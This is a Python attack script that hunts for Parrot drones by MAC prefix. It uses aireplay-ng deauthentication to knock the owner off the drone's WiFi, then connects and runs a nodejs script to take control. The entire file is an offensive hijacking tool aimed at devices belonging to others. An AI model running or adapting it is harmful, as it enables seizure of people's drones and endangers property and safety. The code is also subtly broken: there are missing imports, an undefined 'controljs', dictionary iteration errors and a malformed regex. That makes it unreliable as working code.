#!/usr/bin/python3
import argparse
import glob
import os
import shlex
import subprocess
import time

# get command line arguments
parser = argparse.ArgumentParser(description='hawkdrone main function')
parser.add_argument('wlan1', nargs='?', default='wlan1', metavar='wlan1', help='the wlan interface to be put into monitor mode')
parser.add_argument('wlan2', nargs='?', default='wlan2', metavar='wlan2', help='the wlan interface to connect to the drone wifi')

args = parser.parse_args()

# mac addresses of Parrot drones
parrot_macs = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E']

# initialize main variables
wlan1 = args.wlan1
wlan2 = args.wlan2

dhclient = 'dhclient'
iwconfig = 'iwconfig';
ifconfig = 'ifconfig';
airmon = 'airmon-ng';
aireplay = 'aireplay-ng';
aircrack = 'aircrack-ng';
airodump = 'airodump-ng';
nodejs = 'nodejs';

tmpfile = '/tmp/airodump'

# results variables
wifis = {} # WLAN channels used
clients = {} # drone owners connected to drone WLANs

# execute system call with sudo
def sudo(*args):
	command = 'sudo '
	
	for arg in args:
		command += str(arg) + ' '
	
	os.system(command)
	
def disconnect(aireplay, access_point, client, interface):
	print('Jumping onto drone\'s channel ' + channel)
	sudo(iwconfig, wlan1, "channel", channel);
	time.sleep(1)
	
	print('Disconnecting the true owner of the drone')
	sudo(aireplay, '-0', '3', '-a', access_point, '-c', client, interface)
	print('Done disconnecting the true owner of the drone')
	
# print to stderr
def eprint(*args, **kwargs):
	print(*args, file=sys.stderr, **kwargs)

while True:
	# look for Access Points and write to tmpfile
	cmd = 'sudo ' + airodump + ' --output-format csv -w ' + tmpfile + ' ' + wlan1

	with open('/dev/null') as null:
		process = subprocess.Popen(shlex.split(cmd), stdout=null, stderr=null)
	
	pid = process.pid
	print('airodump pid: ' + str(pid))

	# wait for 6 seconds in total
	time.sleep(3)
	sudo('kill', pid)
	time.sleep(1)
	sudo('kill', '-HUP', pid)
	time.sleep(1)
	sudo('kill', '-9', pid)
	time.sleep(1)
	sudo('killall', '-9', aireplay, airodump)
	
	# read Access Points from tmpfile
	for filename in glob.glob(tmpfile + '+.csv'):
		# iterate over each line
		with open(filename) as file:
			for line in file:
				# check if line contains any of the known Parrot MAC addresses
				for mac in parrot_macs:
					# get drone MAC address (1), drone WLAN channel (2) and drone Wifi name (3)
					pattern = re.compile('^(' + mac + ':[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),')
					match = pattern.match(line)
					
					if match:
						print('CHANNEL ' + match.group(1) + ' ' + match.group(2) + ' ' + match.group(3))
						wifis[match.group(1)] = [match.group(2), match.group(3)]
					
					# get drone owner's MAC address (1) and drone MAC address (2)
					pattern = re.compile('^([\w:]+).*\s(' + mac + ' + :[\w:]+),')
					match = pattern.match(line)
					
					if match:
						print('CLIENT ' + match.group(1) + ' ' + match.group(2))
						clients[match.group(1)] = match.group(2)
					
		#sudo('rm', filename)
	
	# disconnect original owner
	for owner_mac, drone_mac in clients.items():
		channel = wifis[drone_mac][0]
		ssid = wifis[drone_mac][1]
		print('Found client (' + owner_mac + ') connected to ' + ssid + ' (' + drone_mac + ', channel ' + channel + ')')
		
		disconnect(aireplay, drone_mac, owner_mac, wlan2)
		
	# connect to drone and run our code
	for drone_mac, wifi_info in wifis:
		channel = wifi_info[0]
		ssid = wifi_info[1]
		
		print('Connecting to wifi ' + ssid + ' (MAC address ' + drone_mac)
		sudo(iwconfig, wlan2, 'essid', ssid)
		sudo('ifup', wlan2)
		
		print('Acquiring IP from drone')
		sudo(dhclient, '-v', wlan2)
		
		print('Taking over drone')
		sudo(nodejs, controljs)


# put both devices down
sudo(ifconfig, wlan1, 'down')
sudo(ifconfig, wlan2, 'down')